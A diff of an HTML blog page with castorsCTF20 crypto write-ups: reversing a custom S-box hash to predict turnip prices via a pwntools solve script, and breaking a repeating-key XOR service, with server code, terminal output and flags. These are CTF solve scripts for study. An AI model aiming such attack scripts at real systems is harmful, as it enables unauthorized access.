@@ -1,40 +1,7 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>&#x200F;Nils's website - castorsCTF20 write-ups</title>
-    <link rel="stylesheet" type="text/css" href="/assets/css/highlighting.css">
-      <link rel="stylesheet" type="text/css" href="/assets/css/post.css">
-    <link rel="alternate" type="application/atom+xml" title="Nils's blog RSS" href="feed.xml">
-  </head>
-  <body>
-    <header>
-      <h1><a href="/">Nils's website</a></h1>
-    </header>
-    <main>
-      <h2>castorsCTF20 write-ups</h2>
-<p>This weekend, with my team <a href="https://ctftime.org/team/120438">Pwnzorz</a>, we played
-castorsCTF20, we ended up in first place and here are my writeups for the
-challenges I solved. If there’s anything that’s unclear, please send me an email
-or ask me on discord (or any platform you can find me on).</p>
-
-<p><img src="/assets/files/castorsCTF20/scoreboard.png" alt="Final scoreboard" /></p>
-
-<h3 id="crypto">Crypto</h3>
-
-<h4 id="stalk-market-495-pts-18-solves">Stalk Market (495 pts 18 solves)</h4>
-
-<h5 id="description">Description:</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Author: hasu
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>&#x200F;Nils's website - castorsCTF20 write-ups</title><link rel="stylesheet" type="text/css" href="/assets/css/highlighting.css"><link rel="stylesheet" type="text/css" href="/assets/css/post.css"><link rel="alternate" type="application/atom+xml" title="Nils's blog RSS" href="feed.xml"></head><body><header><h1><a href="/">Nils's website</a></h1></header><main><h2>castorsCTF20 write-ups</h2><p>This weekend, with my team <a href="https://ctftime.org/team/120438">Pwnzorz</a>, we played castorsCTF20, we ended up in first place and here are my writeups for the challenges I solved. If there’s anything that’s unclear, please send me an email or ask me on discord (or any platform you can find me on).</p><p><img src="/assets/files/castorsCTF20/scoreboard.png" alt="Final scoreboard"/></p><h3 id="crypto">Crypto</h3><h4 id="stalk-market-495-pts-18-solves">Stalk Market (495 pts 18 solves)</h4><h5 id="description">Description:</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Author: hasu
 
 nc chals20.cybercastors.com 14423
-</code></pre></div></div>
-
-<p>A file <code class="language-plaintext highlighter-rouge">server.py</code> is attached:</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socketserver</span>
+</code></pre></div></div><p>A file <code class="language-plaintext highlighter-rouge">server.py</code> is attached:</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socketserver</span>
 <span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">urandom</span>
 <span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">seed</span><span class="p">,</span> <span class="n">randint</span>
 <span class="kn">from</span> <span class="nn">secret</span> <span class="kn">import</span> <span class="n">FLAG</span>
@@ -142,18 +109,7 @@ the next 20 weeks to become the Ultimate Turnip Prophet!</span><span class="se">
     <span class="n">socketserver</span><span class="p">.</span><span class="n">ThreadingTCPServer</span><span class="p">.</span><span class="n">allow_reuse_address</span> <span class="o">=</span> <span class="bp">True</span>
     <span class="n">server</span> <span class="o">=</span> <span class="n">socketserver</span><span class="p">.</span><span class="n">ThreadingTCPServer</span><span class="p">((</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="mi">8080</span><span class="p">),</span> <span class="n">TaskHandler</span><span class="p">)</span>
     <span class="n">server</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">()</span>
-</code></pre></div></div>
-
-<h5 id="solution">Solution</h5>
-
-<p>I started reading it and noticed a few things which scared me <code class="language-plaintext highlighter-rouge">sbox</code> and
-<code class="language-plaintext highlighter-rouge">hash</code>. <code class="language-plaintext highlighter-rouge">sbox</code> from what I remembered had something to do with cryptography and
-<a href="https://en.wikipedia.org/wiki/S-box">searching online</a> confirmed it.</p>
-
-<p>I then started reading from where code was executed (skip the function
-definitions).</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">TaskHandler</span><span class="p">(</span><span class="n">socketserver</span><span class="p">.</span><span class="n">BaseRequestHandler</span><span class="p">):</span>
+</code></pre></div></div><h5 id="solution">Solution</h5><p>I started reading it and noticed a few things which scared me <code class="language-plaintext highlighter-rouge">sbox</code> and <code class="language-plaintext highlighter-rouge">hash</code>. <code class="language-plaintext highlighter-rouge">sbox</code> from what I remembered had something to do with cryptography and <a href="https://en.wikipedia.org/wiki/S-box">searching online</a> confirmed it.</p><p>I then started reading from where code was executed (skip the function definitions).</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">TaskHandler</span><span class="p">(</span><span class="n">socketserver</span><span class="p">.</span><span class="n">BaseRequestHandler</span><span class="p">):</span>
     <span class="k">def</span> <span class="nf">handle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
         <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">BANNER</span><span class="p">)</span>
         <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">MESSAGE</span><span class="p">)</span>
@@ -163,13 +119,7 @@ definitions).</p>
     <span class="n">socketserver</span><span class="p">.</span><span class="n">ThreadingTCPServer</span><span class="p">.</span><span class="n">allow_reuse_address</span> <span class="o">=</span> <span class="bp">True</span>
     <span class="n">server</span> <span class="o">=</span> <span class="n">socketserver</span><span class="p">.</span><span class="n">ThreadingTCPServer</span><span class="p">((</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="mi">8080</span><span class="p">),</span> <span class="n">TaskHandler</span><span class="p">)</span>
     <span class="n">server</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">()</span>
-</code></pre></div></div>
-
-<p>Is used to serve the challenge and seems unrelated to the problem. The <code class="language-plaintext highlighter-rouge">handle</code>
-function sends the banner and a message and then calls the <code class="language-plaintext highlighter-rouge">challenge</code> function
-which is where the core of the challenge seems to be located.</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
+</code></pre></div></div><p>Is used to serve the challenge and seems unrelated to the problem. The <code class="language-plaintext highlighter-rouge">handle</code> function sends the banner and a message and then calls the <code class="language-plaintext highlighter-rouge">challenge</code> function which is where the core of the challenge seems to be located.</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
         <span class="n">secret</span><span class="p">,</span> <span class="n">hashes</span><span class="p">,</span> <span class="n">prices</span><span class="p">,</span> <span class="n">highest</span> <span class="o">=</span> <span class="n">gen_hashes_and_prices</span><span class="p">()</span>
         <span class="n">req</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">f</span><span class="s">"Price commitments for the week: </span><span class="si">{</span><span class="n">hashes</span><span class="si">}</span><span class="se">\n\n</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
         <span class="n">req</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">f</span><span class="s">"Monday AM Price: </span><span class="si">{</span><span class="n">prices</span><span class="p">[</span><span class="s">'mon'</span><span class="p">][</span><span class="s">'am'</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
@@ -183,18 +133,7 @@ which is where the core of the challenge seems to be located.</p>
     <span class="k">else</span><span class="p">:</span>
         <span class="n">req</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">f</span><span class="s">"Even Tom Nook is impressed. Here's your flag: </span><span class="si">{</span><span class="n">FLAG</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
         <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</code></pre></div></div>
-
-<p>The flag is sent in the else block which is reached when the for loop finishes
-without being exited (with a <code class="language-plaintext highlighter-rouge">break</code> or like in this case with <code class="language-plaintext highlighter-rouge">exit</code>). This
-means we must have <code class="language-plaintext highlighter-rouge">inp == highest[0]</code> 20 times consecutively. Each time
-represents a “week”.</p>
-
-<p>We are given all hashes, the price on Monday at time “am” and are asked to enter
-the time of the highest price in the week. All of these values are retrieved
-from the function <code class="language-plaintext highlighter-rouge">gen_hashes_and_prices</code>.</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">gen_hashes_and_prices</span><span class="p">():</span>
+</code></pre></div></div><p>The flag is sent in the else block which is reached when the for loop finishes without being exited (with a <code class="language-plaintext highlighter-rouge">break</code> or like in this case with <code class="language-plaintext highlighter-rouge">exit</code>). This means we must have <code class="language-plaintext highlighter-rouge">inp == highest[0]</code> 20 times consecutively. Each time represents a “week”.</p><p>We are given all hashes, the price on Monday at time “am” and are asked to enter the time of the highest price in the week. All of these values are retrieved from the function <code class="language-plaintext highlighter-rouge">gen_hashes_and_prices</code>.</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">gen_hashes_and_prices</span><span class="p">():</span>
     <span class="n">d</span> <span class="o">=</span> <span class="p">{</span><span class="s">"mon"</span><span class="p">:</span> <span class="p">{</span><span class="s">"am"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"pm"</span><span class="p">:</span> <span class="mi">0</span><span class="p">},</span><span class="s">"tue"</span><span class="p">:</span> <span class="p">{</span><span class="s">"am"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"pm"</span><span class="p">:</span> <span class="mi">0</span><span class="p">},</span><span class="s">"wed"</span><span class="p">:</span> <span class="p">{</span><span class="s">"am"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"pm"</span><span class="p">:</span> <span class="mi">0</span><span class="p">},</span><span class="s">"thu"</span><span class="p">:</span> <span class="p">{</span><span class="s">"am"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"pm"</span><span class="p">:</span> <span class="mi">0</span><span class="p">},</span><span class="s">"fri"</span><span class="p">:</span> <span class="p">{</span><span class="s">"am"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"pm"</span><span class="p">:</span> <span class="mi">0</span><span class="p">},</span><span class="s">"sat"</span><span class="p">:</span> <span class="p">{</span><span class="s">"am"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"pm"</span><span class="p">:</span> <span class="mi">0</span><span class="p">}}</span>
     <span class="n">secret</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span>
     <span class="n">seed</span><span class="p">(</span><span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">secret</span><span class="p">,</span> <span class="s">'big'</span><span class="p">))</span>
@@ -207,69 +146,12 @@ from the function <code class="language-plaintext highlighter-rouge">gen_hashes_
             <span class="k">if</span> <span class="n">price</span> <span class="o">&gt;</span> <span class="n">highest</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
                 <span class="n">highest</span> <span class="o">=</span> <span class="p">(</span><span class="s">"-"</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">day</span><span class="p">,</span> <span class="n">time</span><span class="p">]),</span> <span class="n">price</span><span class="p">)</span>
     <span class="k">return</span> <span class="n">secret</span><span class="p">.</span><span class="nb">hex</span><span class="p">(),</span> <span class="s">" "</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">hashes</span><span class="p">),</span> <span class="n">d</span><span class="p">,</span> <span class="n">highest</span>
-</code></pre></div></div>
-
-<p>The function <code class="language-plaintext highlighter-rouge">gen_hashes_and_prices</code> generates a <code class="language-plaintext highlighter-rouge">secret</code> using the function
-<code class="language-plaintext highlighter-rouge">urandom()</code> from the module <code class="language-plaintext highlighter-rouge">os</code>. I assumed this function to generate
-cryptographically random numbers (we can’t guess the numbers it will generate
-from previous numbers it generated) as I know <code class="language-plaintext highlighter-rouge">/dev/urandom</code> to be secure, and
-in fact <a href="https://docs.python.org/3/library/os.html#os.urandom">the
-documentation</a> for it
-confirms this is the case. It then sets the seed used by the python <code class="language-plaintext highlighter-rouge">random</code>
-module, which means that if we know the value of <code class="language-plaintext highlighter-rouge">secret</code> we can possibly get
-all the numbers generated, additionally the <code class="language-plaintext highlighter-rouge">random</code> module isn’t
-cryptographically secure which means that with enough numbers generated by it,
-we can guess the next numbers.</p>
-
-<p>The function then iterates over the days in the week from Monday to Saturday
-(excluding Sunday), and for each iterates over the times “am” and “pm”. For each
-times (combination of day and time), it generates a price using the <code class="language-plaintext highlighter-rouge">gen_price</code>
-function and then appends to the list <code class="language-plaintext highlighter-rouge">hashes</code>, the value returned by the
-function <code class="language-plaintext highlighter-rouge">hash</code>, with as input a string made-up of the secret and the day of the
-week, time and price. If the price generated is the highest seen so far,
-<code class="language-plaintext highlighter-rouge">highest</code> is updated.</p>
-
-<p>The <code class="language-plaintext highlighter-rouge">gen_price</code> function generates a price based on 2 calls to <code class="language-plaintext highlighter-rouge">randint</code>. This
-means that knowing the price of Monday at time “am”, means that we have one of
-the number generated and an estimation of another one. Because the seed used by
-the random function is updated each “week”, it means that each “week” is
-independent and we can’t use data from previous weeks to solve the following
-weeks.</p>
-
-<p>I searched online to find how to predict numbers from the <code class="language-plaintext highlighter-rouge">random</code> module. I
-found <a href="https://crypto.stackexchange.com/questions/53811/is-it-possible-to-recover-the-seed-used-by-pythons-pseudo-random-number-generat">a
-post</a>
-the discusses it. However, the answers says that even with 40 generated numbers
-it is not possible to reverse the state of the number generator. Considering
-that for each week, only 24 numbers (2 per generated price, for 2 times for 6
-days per week) are generated, it means that exploiting the <code class="language-plaintext highlighter-rouge">random</code> module seems
-out of reach.</p>
-
-<p>Next I looked at the <code class="language-plaintext highlighter-rouge">hash</code> function. It starts with an initial state and then
-for each group of 16 bytes in the data, changes the state based on it.</p>
-
-<p>At this point I was lost and didn’t know what to do. A teammate, Uzay, who was
-also looking at the challenge said that he managed to run it locally, and that
-it allowed to print some stuff. I followed his suggestion and added a print
-statement that prints the <code class="language-plaintext highlighter-rouge">state</code> in the <code class="language-plaintext highlighter-rouge">hash</code> function for each block of 16
-bytes:</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">data</span> <span class="o">=</span> <span class="n">group</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+</code></pre></div></div><p>The function <code class="language-plaintext highlighter-rouge">gen_hashes_and_prices</code> generates a <code class="language-plaintext highlighter-rouge">secret</code> using the function <code class="language-plaintext highlighter-rouge">urandom()</code> from the module <code class="language-plaintext highlighter-rouge">os</code>. I assumed this function to generate cryptographically random numbers (we can’t guess the numbers it will generate from previous numbers it generated) as I know <code class="language-plaintext highlighter-rouge">/dev/urandom</code> to be secure, and in fact <a href="https://docs.python.org/3/library/os.html#os.urandom">the documentation</a> for it confirms this is the case. It then sets the seed used by the python <code class="language-plaintext highlighter-rouge">random</code> module, which means that if we know the value of <code class="language-plaintext highlighter-rouge">secret</code> we can possibly get all the numbers generated, additionally the <code class="language-plaintext highlighter-rouge">random</code> module isn’t cryptographically secure which means that with enough numbers generated by it, we can guess the next numbers.</p><p>The function then iterates over the days in the week from Monday to Saturday (excluding Sunday), and for each iterates over the times “am” and “pm”. For each times (combination of day and time), it generates a price using the <code class="language-plaintext highlighter-rouge">gen_price</code> function and then appends to the list <code class="language-plaintext highlighter-rouge">hashes</code>, the value returned by the function <code class="language-plaintext highlighter-rouge">hash</code>, with as input a string made-up of the secret and the day of the week, time and price. If the price generated is the highest seen so far, <code class="language-plaintext highlighter-rouge">highest</code> is updated.</p><p>The <code class="language-plaintext highlighter-rouge">gen_price</code> function generates a price based on 2 calls to <code class="language-plaintext highlighter-rouge">randint</code>. This means that knowing the price of Monday at time “am”, means that we have one of the number generated and an estimation of another one. Because the seed used by the random function is updated each “week”, it means that each “week” is independent and we can’t use data from previous weeks to solve the following weeks.</p><p>I searched online to find how to predict numbers from the <code class="language-plaintext highlighter-rouge">random</code> module. I found <a href="https://crypto.stackexchange.com/questions/53811/is-it-possible-to-recover-the-seed-used-by-pythons-pseudo-random-number-generat">a post</a> the discusses it. However, the answers says that even with 40 generated numbers it is not possible to reverse the state of the number generator. Considering that for each week, only 24 numbers (2 per generated price, for 2 times for 6 days per week) are generated, it means that exploiting the <code class="language-plaintext highlighter-rouge">random</code> module seems out of reach.</p><p>Next I looked at the <code class="language-plaintext highlighter-rouge">hash</code> function. It starts with an initial state and then for each group of 16 bytes in the data, changes the state based on it.</p><p>At this point I was lost and didn’t know what to do. A teammate, Uzay, who was also looking at the challenge said that he managed to run it locally, and that it allowed to print some stuff. I followed his suggestion and added a print statement that prints the <code class="language-plaintext highlighter-rouge">state</code> in the <code class="language-plaintext highlighter-rouge">hash</code> function for each block of 16 bytes:</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">data</span> <span class="o">=</span> <span class="n">group</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
     <span class="k">for</span> <span class="n">roundkey</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
         <span class="k">print</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
         <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">round</span><span class="p">):</span>
-</code></pre></div></div>
-
-<p>A file named <code class="language-plaintext highlighter-rouge">secret.py</code> with the following line also had to be added so that
-the program could run:</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">FLAG</span><span class="o">=</span><span class="s">"testing_flag"</span>
-</code></pre></div></div>
-
-<p>Once running this is what was printed on the server.py output when a client
-connected:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python server.py
+</code></pre></div></div><p>A file named <code class="language-plaintext highlighter-rouge">secret.py</code> with the following line also had to be added so that the program could run:</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">FLAG</span><span class="o">=</span><span class="s">"testing_flag"</span>
+</code></pre></div></div><p>Once running this is what was printed on the server.py output when a client connected:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python server.py
 bytearray(b'\xa5Dr\xe4\x97\x92j\xee\xc6\xf1\xc6z.\x94\x03&amp;')
 bytearray(b'\xcb\xc5\xd7\x04?\x96)\xe9#r\xd1\x92\xd7*\x18u')
 bytearray(b'\xa5Dr\xe4\x97\x92j\xee\xc6\xf1\xc6z.\x94\x03&amp;')
@@ -294,20 +176,7 @@ bytearray(b'\xa5Dr\xe4\x97\x92j\xee\xc6\xf1\xc6z.\x94\x03&amp;')
 bytearray(b'\xcb\xc5\xd7\x04?\x96)\xe9#r\xd1\x92\xd7*\x18u')
 bytearray(b'\xa5Dr\xe4\x97\x92j\xee\xc6\xf1\xc6z.\x94\x03&amp;')
 bytearray(b'\xcb\xc5\xd7\x04?\x96)\xe9#r\xd1\x92\xd7*\x18u')
-</code></pre></div></div>
-
-<p>For each time in the day, the state was the same. This is because the data is
-processed in blocks of 16 bytes, and the first 16 bytes are the secret which is
-the same for each day of the week. (Also note that in the output, every other
-line is just the inital state). This means that if we were able to determine the
-state after the first block was processed, we could brute force the different
-possible prices and find the one that matched the hash we get from the server,
-by manually performing the processing of the second block. My initial thought
-was that maybe we could use some kind of “simultaneously” equation to determine
-that state and decided to look at the <code class="language-plaintext highlighter-rouge">hash</code> function, to see whether that was
-possible.</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</code></pre></div></div><p>For each time in the day, the state was the same. This is because the data is processed in blocks of 16 bytes, and the first 16 bytes are the secret which is the same for each day of the week. (Also note that in the output, every other line is just the inital state). This means that if we were able to determine the state after the first block was processed, we could brute force the different possible prices and find the one that matched the hash we get from the server, by manually performing the processing of the second block. My initial thought was that maybe we could use some kind of “simultaneously” equation to determine that state and decided to look at the <code class="language-plaintext highlighter-rouge">hash</code> function, to see whether that was possible.</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
     <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
         <span class="k">return</span> <span class="n">s</span>
     <span class="k">else</span><span class="p">:</span>
@@ -333,22 +202,7 @@ possible.</p>
                 <span class="n">temp</span><span class="p">[</span><span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
             <span class="n">state</span> <span class="o">=</span> <span class="n">temp</span>
     <span class="k">return</span> <span class="n">state</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span>
-</code></pre></div></div>
-
-<p>Looking at the hash function in reverse, I noticed that the last 2 operations of
-each round were reversible, they just 1. changed the order of the bytes 2.
-changed the bytes using the Sbox which is also reversible. The only part that
-isn’t reversible is the <code class="language-plaintext highlighter-rouge">repeated_xor</code> operation which just XORs together its 2
-parameters, the roundkey (i.e. a 16 bytes block of input data), and the current
-state. This meant that in order to reverse it, we needed the input data which
-was already what we were trying to get. This is when I realised we were given
-the price on Monday at the “am” time, which meant that we could actually reverse
-the hash function until we reached the common state shared by all the hashes
-(i.e. the state when the hash function has only processed the secret).</p>
-
-<p>So I started to write a script to do this.</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</code></pre></div></div><p>Looking at the hash function in reverse, I noticed that the last 2 operations of each round were reversible, they just 1. changed the order of the bytes 2. changed the bytes using the Sbox which is also reversible. The only part that isn’t reversible is the <code class="language-plaintext highlighter-rouge">repeated_xor</code> operation which just XORs together its 2 parameters, the roundkey (i.e. a 16 bytes block of input data), and the current state. This meant that in order to reverse it, we needed the input data which was already what we were trying to get. This is when I realised we were given the price on Monday at the “am” time, which meant that we could actually reverse the hash function until we reached the common state shared by all the hashes (i.e. the state when the hash function has only processed the secret).</p><p>So I started to write a script to do this.</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
 </span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -420,17 +274,7 @@ the hash function until we reached the common state shared by all the hashes
         <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">correct</span><span class="p">)</span>
         <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
     <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></div></div>
-
-<p>The <code class="language-plaintext highlighter-rouge">unrounds</code> function does the same thing as is done for each block in the
-<code class="language-plaintext highlighter-rouge">hash</code> function of <code class="language-plaintext highlighter-rouge">server.py</code>, except it does it in reverse. This allows us to
-retrieve the state that is common to all hashes. Then in the <code class="language-plaintext highlighter-rouge">find_highest</code>
-function, I go through each time in each day (combination of day of week and
-“am” or “pm”), and find by brute forcing which price is correct and get the
-highest correct value. Once this is done, <code class="language-plaintext highlighter-rouge">find_highest</code> returns with the time
-at which the price is highest and sends it to the server.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./client.py
+</code></pre></div></div><p>The <code class="language-plaintext highlighter-rouge">unrounds</code> function does the same thing as is done for each block in the <code class="language-plaintext highlighter-rouge">hash</code> function of <code class="language-plaintext highlighter-rouge">server.py</code>, except it does it in reverse. This allows us to retrieve the state that is common to all hashes. Then in the <code class="language-plaintext highlighter-rouge">find_highest</code> function, I go through each time in each day (combination of day of week and “am” or “pm”), and find by brute forcing which price is correct and get the highest correct value. Once this is done, <code class="language-plaintext highlighter-rouge">find_highest</code> returns with the time at which the price is highest and sends it to the server.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./client.py
 [+] Opening connection to chals20.cybercastors.com on port 14423: Done
 sat-am
 thu-am
@@ -458,50 +302,20 @@ $
 $
 [*] Closed connection to chals20.cybercastors.com port 14423
 [*] Got EOF while sending in interactive
-</code></pre></div></div>
-
-<h5 id="flag">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{y0u_4r3_7h3_u1t1m4t3_turn1p_pr0ph37}
-</code></pre></div></div>
-
-<h4 id="one-trick-pony-236-pts-116-solves">One Trick Pony (236 pts 116 solves)</h4>
-
-<h5 id="description-1">Description</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Author: hasu
+</code></pre></div></div><h5 id="flag">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{y0u_4r3_7h3_u1t1m4t3_turn1p_pr0ph37}
+</code></pre></div></div><h4 id="one-trick-pony-236-pts-116-solves">One Trick Pony (236 pts 116 solves)</h4><h5 id="description-1">Description</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Author: hasu
 nc chals20.cybercastors.com 14422
-</code></pre></div></div>
-
-<h5 id="solution-1">Solution</h5>
-
-<p>When you connect to the endpoint given, you get a prompt and when you type
-something, you get what looks like a C-string literal (It’s actually just a
-python byte string but I didn’t notice that when I first solved the challenge)
-of the same length as your input.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc chals20.cybercastors.com 14422
+</code></pre></div></div><h5 id="solution-1">Solution</h5><p>When you connect to the endpoint given, you get a prompt and when you type something, you get what looks like a C-string literal (It’s actually just a python byte string but I didn’t notice that when I first solved the challenge) of the same length as your input.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc chals20.cybercastors.com 14422
 &gt; please give me feedback
 b'\x13\r\x16\x15\x1c\x17S$=0\x1eK^VP9\x1cU\x11\x10&gt;\x08X'
 &gt; aaaa
 b'\x02\x12\x15'
 &gt; ^C
-</code></pre></div></div>
-
-<p>The name of the challenge “One Trick Pony”, made me think of <a href="https://en.wikipedia.org/wiki/One-time_pad">one-time
-pads</a>, so I thought of XOR-ing my
-input with the output we’re given:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc chals20.cybercastors.com 14422
+</code></pre></div></div><p>The name of the challenge “One Trick Pony”, made me think of <a href="https://en.wikipedia.org/wiki/One-time_pad">one-time pads</a>, so I thought of XOR-ing my input with the output we’re given:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc chals20.cybercastors.com 14422
 &gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 b'\x02\x12\x15\x0e\x13\x12"5\'\x1a\nRR\x11&gt;\x18Q\x14\x13&gt;\nR\x18T&gt;TR\x02\x13RV&gt;U\x0f\x05&gt;\x05Q\x0fV&gt;\x13R\x14TR&gt;V\tR\x0c@\x1c\x02\x12\x15\x0e\x13\x12"5\'\x1a\nRR\x11&gt;\x18Q\x14\x13&gt;\nR\x18T&gt;TR\x02\x13RV&gt;U\x0f\x05&gt;\x05Q\x0fV&gt;\x13R\x14TR&gt;V\tR\x0c@\x1c\x02\x12\x15\x0e\x13\x12"5\'\x1a\nRR\x11&gt;\x18Q\x14\x13&gt;\nR\x18T&gt;TR\x02\x13RV&gt;U\x0f\x05&gt;\x05Q\x0fV&gt;\x13R\x14TR&gt;V\tR\x0c@\x1c\x02'
 &gt; ^C
-</code></pre></div></div>
-
-<p>As I hadn’t noticed it was a byte string and I’m generally prefer to use C for
-byte manipulation I wrote a “script in C”:</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+</code></pre></div></div><p>As I hadn’t noticed it was a byte string and I’m generally prefer to use C for byte manipulation I wrote a “script in C”:</p><div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
 </span>
 <span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
 
@@ -511,99 +325,22 @@ byte manipulation I wrote a “script in C”:</p>
 		<span class="n">putchar</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
 	<span class="p">}</span>
